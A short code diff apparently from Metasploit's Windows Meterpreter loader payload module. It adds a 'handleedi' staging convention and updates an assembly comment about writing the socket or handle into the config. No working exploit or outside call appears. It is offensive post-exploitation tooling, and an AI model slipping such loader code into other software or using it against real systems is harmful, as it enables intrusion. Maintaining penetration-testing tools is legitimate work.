@@ -28,7 +28,7 @@ module Payload::Windows::MeterpreterLoader
       ],
       'Platform'      => 'win',
       'Arch'          => ARCH_X86,
-      'PayloadCompat' => { 'Convention' => 'sockedi -https', },
+      'PayloadCompat' => { 'Convention' => 'sockedi handleedi -https', },
       'Stage'         => { 'Payload'   => "" }
       ))
   end
@@ -55,7 +55,7 @@ module Payload::Windows::MeterpreterLoader
 
     unless opts[:stageless]
       asm << %Q^
-          mov [ebx], edi        ; write the current socket to the config
+          mov [ebx], edi        ; write the current socket/handle to the config
       ^
     end
 
